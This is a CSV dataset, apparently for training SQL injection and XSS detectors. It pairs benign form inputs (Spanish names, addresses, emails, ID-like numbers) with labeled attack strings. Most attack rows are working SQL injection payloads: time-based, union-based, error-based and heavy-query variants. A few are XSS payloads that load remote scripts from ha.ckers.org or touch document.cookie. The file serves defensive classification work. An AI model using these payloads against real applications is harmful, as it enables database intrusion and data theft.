Text,attack_type,Label,type
"1) where 6720=6720 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
balaguer,norm,0,normal
"-1418"") where 7528=7528 order by 1#",sqli,1,normal
"1%' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
1');begin user_lock.sleep(5); end and ('nchh'='nchh,sqli,1,sql
erill,norm,0,normal
emperador,norm,0,normal
de la poza sansabria,norm,0,normal
"1'||(select 'uyfo' where 1236=1236 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,1,sql
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)-- bqxe",sqli,1,sql
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
celula1io,norm,0,normal
ceibo,norm,0,normal
rusch de celis,norm,0,normal
"1"")) as oxrr where 6141=6141 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
3318,norm,0,normal
roleson,norm,0,normal
3920119286282198,norm,0,normal
tabuyo-cardille@multaspendientes.bf,norm,0,normal
ibero,norm,0,normal
3591958882412356,norm,0,normal
"1"" where 2989=2989 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-5640"")) or 9792=2728--",sqli,1,sql
odonovan@piaceredelivery.ro,norm,0,normal
81881966b,norm,0,normal
enco,norm,0,normal
1') where 4509=4509 union all select null--,sqli,1,sql
vinko,norm,0,normal
5599,norm,0,normal
castildelgado,norm,0,normal
lobanillo,norm,0,normal
prab8,norm,0,normal
"-8981%""))) union all select 4538,4538,4538,4538,4538,4538,4538#",sqli,1,sql
osornillo,norm,0,normal
05240,norm,0,normal
jovita,norm,0,normal
"-2013"")) as kisy where 3802=3802 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
fornelos de montes,norm,0,normal
1%'))) and (select * from (select(sleep(5)))fzno) and ((('%'=',sqli,1,sql
1;select (case when (2768=8868) then 2768 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
5e56ir2,norm,0,normal
solosancho,norm,0,normal
faimunda,norm,0,normal
entwistle_ruetting@comonuevo.ro,norm,0,normal
"passeig de les palmeres, s/n",norm,0,normal
gubern jalmar,norm,0,normal
shakor,norm,0,normal
1');begin dbms_lock.sleep(5); end and ('uxzv'='uxzv,sqli,1,sql
"sargento luna, 184",norm,0,normal
psitacosis,norm,0,normal
1';begin dbms_lock.sleep(5); end and 'aenf'='aenf,sqli,1,sql
gerino,norm,0,normal
"1%'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('%'='",sqli,1,normal
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""prhp""=""prhp",sqli,1,sql
"1 where 2292=2292 union all select null,null,null,null#",sqli,1,sql
livino,norm,0,normal
"-8609' union all select 9384,9384,9384,9384--",sqli,1,sql
1 or (select * from (select(sleep(5)))ydpu),sqli,1,sql
"-5130')) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",sqli,1,sql
"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",xss,2,normal
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
beckwith,norm,0,normal
repuesta,norm,0,normal
zapasiewicz@pinkplanetplasencia.bn,norm,0,normal
fetzko,norm,0,normal
"1%"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""%""=""",sqli,1,sql
"1"") where 4038=4038 or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
"1) as nlig where 5964=5964 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
neel@deseoun.aq,norm,0,normal
1ici3a6te,norm,0,normal
"calle sanchez guerrero, 63, 10?h",norm,0,normal
48748000y,norm,0,normal
317,norm,0,normal
-7979'+(select 'bkvt' where 3613=3613 union all select 3613#,sqli,1,sql
1' in boolean mode) and (select * from (select(sleep(5)))fzno)#,sqli,1,sql
"1,(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",sqli,1,sql
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",sqli,1,sql
1%'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',sqli,1,sql
07310,norm,0,normal
"1,updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)",sqli,1,sql
5730165780562734,norm,0,normal
emesh,norm,0,normal
36844689t,norm,0,normal
novendial,norm,0,normal
orgulleza,norm,0,normal
altamiranda aragons,norm,0,normal
"1) where 8630=8630 union all select null,null--",sqli,1,sql
"1'||(select 'tmsj' where 2971=2971 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1"")) as nhus where 3689=3689;if(4135=2165) select 4135 else drop function otyy--",sqli,1,sql
"1"")) as casz where 5921=5921 rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
6395384194321483,norm,0,normal
yax,norm,0,normal
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('dfsj'='dfsj",sqli,1,sql
19312,norm,0,normal
1 or (select * from (select(sleep(5)))ydpu)-- paxv,sqli,1,sql
liebman6@maquillajeparalabios.va,norm,0,normal
1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
1';waitfor delay '0:0:5',sqli,1,sql
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1)) as oywa where 7951=7951 union all select null,null,null,null,null,null#",sqli,1,sql
1'+(select smze where 5616=5616;select (case when (7978=6009) then 7978 else 1/(select 0) end)--,sqli,1,sql
"<xml id=""xss""><i><b><img id=xss src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span dataid=xss src=""#xss"" datafld=""b"" dataformatas=""html""></span>",xss,2,sql
"-6940') union all select 3042,3042,3042,3042,3042#",sqli,1,sql
c/ mayolica 158 4a,norm,0,normal
"1%'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('%'='",sqli,1,sql
1') rlike (select * from (select(sleep(5)))sgvo) and ('cmqe' like 'cmqe,sqli,1,sql
luque,norm,0,normal
"glorieta musico emilio alvarez anton 153,",norm,0,normal
duplan,norm,0,normal
nabau fuentes,norm,0,normal
donhierro,norm,0,normal
catchot bacard,norm,0,normal
4755757006243984,norm,0,normal
hara,norm,0,normal
ancho,norm,0,normal
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
"1"" and sleep(5) and ""tdid"" like ""tdid",sqli,1,normal
ag2u7a,norm,0,normal
"1 where 6221=6221 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1%' or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
5a4a84e8a,norm,0,normal
-8397'))) or 2171=4788,sqli,1,normal
"1') as fkpn where 1100=1100;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
santa colomba de somoza,norm,0,normal
koprulu,norm,0,normal
1714562160313645,norm,0,normal
mary-ann,norm,0,normal
?revivir,norm,0,normal
1') as gdie where 8133=8133 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
panov@ballerpoker.sh,norm,0,normal
peracaul cerf,norm,0,normal
"1)) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1"") rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
decapitar,norm,0,normal
caca ihnen,norm,0,normal
"1%"") waitfor delay '0:0:5'--",sqli,1,sql
argentino,norm,0,normal
kathrine,norm,0,normal
gussack.reinecke@eddydaniele.pt,norm,0,normal
07951538r,norm,0,normal
6162508820566713,norm,0,normal
bohord1r,norm,0,normal
1' rlike (select (case when (6855=1056) then 1 else 0x28 end)) and 'pmrz' like 'pmrz,sqli,1,sql
1%' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'=',sqli,1,sql
1'+(select 'zjvx' where 4683=4683 and 6969=(select 6969 from pg_sleep(5)))+',sqli,1,sql
40574017q,norm,0,normal
aldeaseca,norm,0,normal
aimar taulats,norm,0,normal
sims,norm,0,normal
calle madagascar 130,norm,0,normal
funicello-gadden@18horas.fo,norm,0,normal
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",sqli,1,normal
8249,norm,0,normal
"c/ venus 91, 1e",norm,0,normal
rapisarda_macginnis@discography.ye,norm,0,normal
pecelln,norm,0,normal
08518,norm,0,normal
mostazal,norm,0,normal
sogorb ipamo,norm,0,normal
(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual),sqli,1,sql
"-1040 where 3058=3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",sqli,1,sql
mundy,norm,0,normal
7173154653829351,norm,0,normal
corello6@eurograb.id,norm,0,normal
6204145249044457,norm,0,normal
5830397031097456,norm,0,normal
49250,norm,0,normal
8120300504791286,norm,0,normal
"1"") as kslq where 8669=8669 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
6140461790572625,norm,0,normal
avenida presidente carrero blanco 134,norm,0,normal
poyatos,norm,0,normal
basiano,norm,0,normal
"1%"") and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
cornejo,norm,0,normal
"calle jazmin, s/n, 9-d",norm,0,normal
45914021h,norm,0,normal
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1,sql
munbrega,norm,0,normal
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('cenk'='cenk",sqli,1,normal
hanhua,norm,0,normal
calle orotava 31,norm,0,normal
"-8790') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('nsze' like 'nsze",sqli,1,sql
26033,norm,0,normal
3348558480673240,norm,0,normal
1')) and 6969=(select 6969 from pg_sleep(5)) and (('prjf'='prjf,sqli,1,sql
fischetti.bacall@players.com.gr,norm,0,normal
13270596x,norm,0,normal
"1 where 2146=2146 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1'||(select 'zyvk' from dual where 2072=2072;begin user_lock.sleep(5); end)||',sqli,1,sql
vilafant,norm,0,normal
"1') and elt(3528=3566,3566)",sqli,1,normal
16741,norm,0,normal
1%')));select pg_sleep(5)--,sqli,1,sql
-9148) where 2027=2027 or 8571=8571--,sqli,1,sql
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
74725623a,norm,0,normal
"calle hostieros, 24",norm,0,normal
reinhard,norm,0,normal
51993302p,norm,0,normal
7661,norm,0,normal
10650,norm,0,normal
"(select (case when (1343=1343) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1343 end) from dual)",sqli,1,sql
fitness,norm,0,normal
6285982305475025,norm,0,normal
6646364867316406,norm,0,normal
isabel la catolica 199,norm,0,normal
carmel@almeriastella.cm,norm,0,normal
sandie,norm,0,normal
9u55c89cia,norm,0,normal
"-8699"") union all select 8645,8645,8645,8645,8645,8645--",sqli,1,sql
molet,norm,0,normal
4nemmetr6,norm,0,normal
"-1<bgsound src=""javascript:document.cookie=true;"">",xss,2,xss
estantalar,norm,0,normal
"1')) as bbdf where 1327=1327;iif(8354=3515,1,1/0)",sqli,1,sql
1776,norm,0,normal
"1') union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
38820,norm,0,normal
"1"")) and elt(4249=4249,7259) and ((""abcm"" like ""abcm",sqli,1,normal
forcades chocano,norm,0,normal
metyn,norm,0,normal
1) where 9821=9821 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
vano branchadell,norm,0,normal
-3211)) as fsej where 6348=6348 or 9805=3783--,sqli,1,sql
"1) as agex where 8167=8167 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
-1760))) or (8459=8459)*4906 and (((1541=1541,sqli,1,normal
"1'))) union all select null,null,null,null,null,null#",sqli,1,sql
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('nxkp' like 'nxkp,sqli,1,sql
"1' in boolean mode) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
puebla de belea,norm,0,normal
"<link rel=""stylesheet"" href=""http://ha.ckers.org/xss.css"">",xss,2,normal
"-4407"") where 2055=2055 or elt(9714=5040,5040)--",sqli,1,sql
14860,norm,0,normal
haker-durango@mirallesmoscardo.ro,norm,0,normal
zunuzi,norm,0,normal
rosic@faders.com.sn,norm,0,normal
"1%"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",sqli,1,sql
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'qvyq' like 'qvyq",sqli,1,sql
dermidio,norm,0,normal
"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('%'='",sqli,1,sql
despernada,norm,0,normal
0858629096397391,norm,0,normal
p+laneador,norm,0,normal
-6353%')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'=',sqli,1,sql
"avda. infante don jaime, 133,",norm,0,normal
raichs morcillo,norm,0,normal
"-9440"" union all select 5599,5599,5599,5599,5599--",sqli,1,sql
"1"") union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
oa,norm,0,normal
peiser,norm,0,normal
nealson,norm,0,normal
"1' where 4358=4358 union all select null,null,null,null--",sqli,1,sql
">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss,2,sql
c63en13759,norm,0,normal
"1"" where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
salinillas de bureba,norm,0,normal
borrica,norm,0,normal
leclerc,norm,0,normal
san ildefonso,norm,0,normal
pellizza echevarra,norm,0,normal
"patio poeta luis rosales, 50 8f",norm,0,normal
2191,norm,0,normal
bus ugartechea,norm,0,normal
"1"";begin user_lock.sleep(5); end",sqli,1,sql
desafinar,norm,0,normal
tei,norm,0,normal
1') where 9317=9317 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
9813,norm,0,normal
c/ dos de mayo 89 13?b,norm,0,normal
1;begin dbms_lock.sleep(5); end-- elvi,sqli,1,sql
"-8734%"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",sqli,1,sql
"1'+(select 'bztp' where 2541=2541 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
-8015) where 9808=9808 or 9323=9323#,sqli,1,normal
"1"") where 4964=4964;(select * from (select(sleep(5)))srmq)--",sqli,1,sql
9.84is22nte334c799,norm,0,normal
"c/ cardenal cisneros 70, 12?d",norm,0,normal
serral torrell,norm,0,normal
more@soymuyguapa.es,norm,0,normal
8000,norm,0,normal
benegiles,norm,0,normal
acachorrar,norm,0,normal
-1940 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1,sql
rinaldi albiol,norm,0,normal
nina,norm,0,normal
torcuarto,norm,0,normal
edelman1@hotelestopsecret.mt,norm,0,normal
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vhqm'='vhqm,sqli,1,sql
"-2086%'))) or make_set(9354=9354,7185) and ((('%'='",sqli,1,normal
nahmias,norm,0,normal
morten,norm,0,normal
"1%')) or elt(6272=6272,sleep(5)) and (('%'='",sqli,1,normal
39660,norm,0,normal
d4scubridora,norm,0,normal
"1"") as tnux where 4888=4888 rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
"cami can manuel, 117,",norm,0,normal
72500690k,norm,0,normal
narbo_nesa,norm,0,normal
19119,norm,0,normal
"-3628"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
"1 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
hornillos del camino,norm,0,normal
mario caraball,norm,0,normal
morocz,norm,0,normal
77300409p,norm,0,normal
halford,norm,0,normal
robadora,norm,0,normal
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""%""=""",sqli,1,sql
1') as ncou where 9166=9166 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
"1"") as upyn where 6185=6185 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
5939201790739270,norm,0,normal
"-5424')) union all select 8231,8231,8231,8231,8231,8231,8231,8231#",sqli,1,sql
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'uqyt'='uqyt",sqli,1,sql
piwkowsk,norm,0,normal
saiah.bauer@intapisur.mc,norm,0,normal
decacque,norm,0,normal
"<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",xss,2,xss
42ec0sei1a1a,norm,0,normal
atajar,norm,0,normal
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('fgox' like 'fgox",sqli,1,sql
6a0j19o,norm,0,normal
"carrer castellfollit, s/n, 9-a",norm,0,normal
17539,norm,0,normal
1' where 1593=1593;begin user_lock.sleep(5); end--,sqli,1,sql
ehninger,norm,0,normal
"1')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
27340064x,norm,0,normal
alborea,norm,0,normal
kipnis,norm,0,normal
divinizacin,norm,0,normal
dre,norm,0,normal
su6sc87u23r,norm,0,normal
angeliek,norm,0,normal
po2546oto4,norm,0,normal
78719482g,norm,0,normal
"1'||(select 'pmpd' where 9803=9803;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",sqli,1,sql
"-6766"" where 6591=6591 or make_set(9354=9354,7185)--",sqli,1,sql
samper de calanda,norm,0,normal
04888,norm,0,normal
1 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
talmadge@movintel.uz,norm,0,normal
1'))) waitfor delay '0:0:5' and ((('wvzb'='wvzb,sqli,1,normal
wakefiel7,norm,0,normal
-8515' or 1329=9536,sqli,1,normal
1990568850978005,norm,0,normal
09763,norm,0,normal
2e0814r1pada,norm,0,normal
1);begin user_lock.sleep(5); end--,sqli,1,sql
1');select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
sel,norm,0,normal
villaseco del pan,norm,0,normal
"1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('uzxr'='uzxr",sqli,1,sql
1%' rlike sleep(5)#,sqli,1,normal
1005,norm,0,normal
5389852449679105,norm,0,normal
reith,norm,0,normal
"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",sqli,1,sql
"1') where 2725=2725 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
ronna,norm,0,normal
moraine@tintaultravioleta.tr,norm,0,normal
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
rapaport.iloloubek@ajuntamentbarcelona20.com,norm,0,normal
5580428033394873,norm,0,normal
cardeosa,norm,0,normal
devy,norm,0,normal
"1%' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='",sqli,1,sql
8arem3to,norm,0,normal
"1) as asmt where 4986=4986 union all select null,null#",sqli,1,sql
78721857x,norm,0,normal
bascuana de san pedro,norm,0,normal
"1"")) as tljw where 8474=8474 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
"-3604') as fyev where 7259=7259 union all select 7259,7259,7259,7259--",sqli,1,sql
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""swec"" like ""swec",sqli,1,sql
olalia,norm,0,normal
"1 and elt(4249=4249,7259)# lwyo",sqli,1,normal
"-7686%"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1'));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
5562206225092204,norm,0,normal
6128210900567560,norm,0,normal
3155,norm,0,normal
calabrs,norm,0,normal
"1%'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",sqli,1,sql
-2207%') or (8459=8459)*4906 and ('%'=',sqli,1,normal
1'+(select gqez where 3704=3704;select (case when (9030=6952) then 1 else 9030*(select 9030 from master..sysdatabases) end)--,sqli,1,sql
"1"") as kfvy where 7305=7305 or sleep(5)--",sqli,1,sql
47270196k,norm,0,normal
yuncos,norm,0,normal
mcculloc,norm,0,normal
1299,norm,0,normal
8319,norm,0,normal
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('dcys' like 'dcys",sqli,1,sql
sant celoni,norm,0,normal
atora,norm,0,normal
gamarnik9,norm,0,normal
197,norm,0,normal
